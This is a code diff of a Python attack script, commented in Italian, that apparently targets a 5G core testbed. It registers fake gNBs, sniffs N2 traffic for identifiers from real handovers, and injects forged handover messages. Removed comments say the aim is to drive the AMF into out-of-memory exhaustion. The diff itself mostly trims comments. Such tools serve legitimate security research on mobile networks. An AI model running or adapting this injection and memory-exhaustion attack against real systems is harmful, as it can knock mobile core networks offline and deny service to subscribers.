@@ -6,8 +6,7 @@ class SnifferN2:
     def __init__(self, pcap_path):
         self.pcap_path = pcap_path
         self.visti = set()
-        # t0 fissato ALL'AVVIO dello sniffer (prima del trigger dell'handover): accetto
-        # solo gli HandoverNotify catturati dopo, cioe' quello di QUESTA iterazione.
+        # t0 fissato dello sniffer
         self.t0 = time.time()
 
     def attendi_handover_legittimo(self, timeout=20):
@@ -18,9 +17,6 @@ class SnifferN2:
         pcap_dir = os.path.dirname(os.path.abspath(self.pcap_path))
         pcap_name = os.path.basename(self.pcap_path)
         
-        # tshark NATIVO (non docker): leggero e affidabile anche quando l'AMF e' saturo e la
-        # pressione di memoria farebbe fallire l'avvio di un container. Cosi' l'attaccante
-        # legge il pcap e continua a iniettare fino all'OOM (>1024 MB alla ~17a iniezione).
         cmd = (
             f"tshark -r {os.path.abspath(self.pcap_path)} -Y 'ngap.procedureCode==11' "
             f"-T fields -e frame.time_epoch -e ngap.AMF_UE_NGAP_ID 2>/dev/null"
@@ -52,11 +48,7 @@ class SnifferN2:
                 pass
 
             time.sleep(0.5)
-
-        # Timeout: nessun handover legittimo NUOVO. In fase satura l'AMF non completa piu'
-        # gli handover e non genera nuovi AMF-UE-NGAP-ID: coerente con lo scenario, riuso
-        # l'ULTIMO identificativo valido gia' visto nel pcap per continuare a iniettare
-        # (le richieste vengono rifiutate ma la memoria continua a crescere fino all'OOM).
+            
         try:
             out = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode().strip()
             tutti = [int(p.split()[-1]) for p in out.splitlines()
@@ -75,8 +67,8 @@ class Attaccante:
         self.nome = nome or os.environ.get("GNB_NAME", "gNB-OAI")
 
     def mimicry_reattivo(self, count, pcap_path):
-        # crea PRIMA lo sniffer (fissa t0) e SOLO DOPO registra i finti gNB: cosi' t0 resta
-        # anteriore al trigger dell'handover anche se le registrazioni sono lente (netem su N2).
+        # crea PRIMA lo sniffer (fissa t0) e dopo registra i finti gNB: cosi' t0 resta
+        # prima del trigger relativo all'handover
         sniffer = SnifferN2(pcap_path)
         target = GnbFinto(self.target, self.nome); target.registrati()
         source = GnbFinto(self.source, self.nome); source.registrati()
@@ -87,7 +79,7 @@ class Attaccante:
         accettate = 0
         for i in range(1, count + 1):
             
-            # 1. Attesa passiva: si blocca finché non intercetta un Handover reale
+            #si blocca finché non intercetta un handover reale
             amf_sniffato = sniffer.attendi_handover_legittimo()
             
             if amf_sniffato is None:
@@ -96,7 +88,7 @@ class Attaccante:
                 
             print(f"[!] Trigger avvenuto: Sniffato nuovo AMF-UE-NGAP-ID={amf_sniffato}")
             
-            # 2. Iniezione istantanea usando l'ID appena catturato
+            #iniezione istantanea usando l'ID appena catturato
             ok = source.invia_handover(i, amf_sniffato, self.target)
             target.svuota()
             accettate += int(ok)
@@ -112,8 +104,6 @@ class Attaccante:
 def main():
     ap = argparse.ArgumentParser()
     sub = ap.add_subparsers(dest="mode", required=True)
-    
-    # Sostituiamo il vecchio parser statico con il nuovo parser reattivo
     sp = sub.add_parser("mimicry_reattivo")
     sp.add_argument("--count", type=int, default=1, help="numero di iniezioni malevole")
     sp.add_argument("--pcap", required=True, help="percorso del file PCAP per lo sniffing in real-time")
